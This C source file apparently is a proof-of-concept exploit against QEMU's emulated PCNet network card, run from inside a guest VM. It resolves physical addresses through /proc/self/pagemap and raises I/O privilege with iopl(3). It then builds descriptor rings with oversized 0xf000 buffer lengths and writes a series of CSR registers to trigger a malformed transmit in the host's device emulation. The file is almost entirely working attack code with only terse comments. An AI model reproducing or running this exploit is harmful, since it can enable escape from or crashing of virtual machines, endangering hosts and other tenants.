/*
* @Author: resery
* @Date:   2020-10-14 15:41:43
* @Last Modified by:   resery
* @Last Modified time: 2020-10-19 09:17:53
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <stdint.h>
#include <string.h> 
#include <stdio.h> 

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

#define page_aligned __attribute__((aligned(PAGE_SIZE)))

#define PCNET_BUFFER_SIZE 4096
#define PCNET_PORT        0xc140

struct pcnet_initblk32 {
    uint16_t mode;
    uint8_t rlen;
    uint8_t tlen;
    uint16_t padr[3];
    uint16_t _res;
    uint16_t ladrf[4];
    uint32_t rdra;
    uint32_t tdra;
};

struct pcnet_TMD {
    uint32_t tbadr;
    int16_t length;
    int16_t status;
    uint32_t misc;
    uint32_t res;
};

struct pcnet_RMD {
    uint32_t rbadr;
    int16_t buf_length;
    int16_t status;
    uint32_t msg_length;
    uint32_t res;
};

#define CRC(crc, ch) (crc = (crc >> 8) ^ crctab[(crc ^ (ch)) & 0xff])

size_t virtuak_addr_to_physical_addr(void *addr){
    uint64_t data;

    int fd = open("/proc/self/pagemap",O_RDONLY);
    if(!fd){
        perror("open pagemap");
        return 0;
    }

    size_t pagesize = getpagesize();
    size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);

    if(lseek(fd,offset,SEEK_SET) < 0){
        puts("lseek");
        close(fd);
        return 0;
    }

    if(read(fd,&data,8) != 8){
        puts("read");
        close(fd);
        return 0;
    }

    if(!(data & (((uint64_t)1 << 63)))){
        puts("page");
        close(fd);
        return 0;
    }

    size_t pageframenum = data & ((1ull << 55) - 1);
    size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;

    close(fd);

    return phyaddr;
}

uint32_t set_csr_15_value_equal_2(struct pcnet_initblk32 *initblk32,uint32_t cxda,uint32_t crda){
    initblk32->mode = 4;
    initblk32->tdra = cxda;
    initblk32->rdra = crda;
    return virtuak_addr_to_physical_addr(initblk32);
}

uint32_t set_tmd(struct pcnet_TMD *tmd){
    tmd->length = 0xf000;
    tmd->status = 0x8300;
    return virtuak_addr_to_physical_addr(tmd);
}

uint32_t set_rmd(struct pcnet_RMD *rmd){
    rmd->buf_length = 0xf000;
    rmd->status = 0x8000; 
    return virtuak_addr_to_physical_addr(rmd);
}

int main(){
    struct pcnet_initblk32 *initblk32;
    struct pcnet_TMD *tmd;
    struct pcnet_RMD *rmd;
    uint32_t pcnet_initblk32_mem;
    uint32_t pcnet_tmd_mem;
    uint32_t pcnet_rmd_mem;

    void *addr;

    uint32_t fcs = ~0;
    uint8_t *ptr;

    uint16_t initblk32_lo, initblk32_hi;
    uint16_t tmd_lo, tmd_hi;
    uint16_t rmd_lo, rmd_hi;
    
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }

    tmd = (struct pcnet_TMD *)aligned_alloc(
        PAGE_SIZE, sizeof(struct pcnet_TMD));
    rmd = (struct pcnet_RMD *)aligned_alloc(
        PAGE_SIZE, sizeof(struct pcnet_RMD));
    initblk32 = (struct pcnet_initblk32 *)aligned_alloc(
        PAGE_SIZE, sizeof(struct pcnet_initblk32));
    
    pcnet_tmd_mem = (uint32_t)set_tmd(tmd);
    pcnet_rmd_mem = (uint32_t)set_rmd(rmd);
    pcnet_initblk32_mem = (uint32_t)set_csr_15_value_equal_2(initblk32, pcnet_tmd_mem, pcnet_rmd_mem);

    tmd_lo = (uint16_t)pcnet_tmd_mem;
    tmd_hi = pcnet_tmd_mem >> 16;
    rmd_lo = (uint16_t)pcnet_rmd_mem;
    rmd_hi = pcnet_rmd_mem >> 16;
    initblk32_lo = (uint16_t)pcnet_initblk32_mem;
    initblk32_hi = pcnet_initblk32_mem >> 16;

    iopl(3);

    inw(PCNET_PORT + 0x14);

    outw(58, PCNET_PORT + 0x12);
    outw(0x102, PCNET_PORT + 0x10);

    printf("tmd_addr:\t %p\n",pcnet_tmd_mem);
    printf("rmd_addr:\t %p\n",pcnet_rmd_mem);
    printf("initblk32_addr:\t %p\n",pcnet_initblk32_mem);

    //first set csr[2] << 16 | csr[1]
    //sencond if csr[2] << 16 | csr[1] that mode = 4 and csr[15] != 2
    //third if csr[15] != 2 that csr[0] | 0x10
    outw(1, PCNET_PORT + 0x12);
    outw(initblk32_lo, PCNET_PORT + 0x10);
    outw(2, PCNET_PORT + 0x12);
    outw(initblk32_hi, PCNET_PORT + 0x10);

    //set cxda = tmd_addr
    outw(34, PCNET_PORT + 0x12);
    outw(tmd_lo, PCNET_PORT + 0x10);
    outw(35, PCNET_PORT + 0x12);
    outw(tmd_hi, PCNET_PORT + 0x10);
    
    //CSR_DPOLL
    outw(4, PCNET_PORT + 0x12);
    outw(0x1000, PCNET_PORT + 0x10);

    //pcnet_init and pcnet_start
    outw(0,PCNET_PORT + 0x12);
    outw(3,PCNET_PORT + 0x10);

    //set CSR_SPND
    outw(5, PCNET_PORT + 0x12);
    outw(0x1, PCNET_PORT + 0x10);

    //CSR_PROM
    outw(15, PCNET_PORT + 0x12);
    outw(0x8004, PCNET_PORT + 0x10);

    //CSR_CRST
    outw(41, PCNET_PORT + 0x12);
    outw(0x8000, PCNET_PORT + 0x10);

    //set crda = rmd_addr
    outw(28, PCNET_PORT + 0x12);
    outw(rmd_lo, PCNET_PORT + 0x10);
    outw(29, PCNET_PORT + 0x12);
    outw(rmd_hi, PCNET_PORT + 0x10);

    //clear CSR_SPND
    outw(5, PCNET_PORT + 0x12);
    outw(0, PCNET_PORT + 0x10);

    sleep(2);

    //call pcnet_transmit
    outw(0,PCNET_PORT + 0x12);
    outw(8,PCNET_PORT + 0x10);
}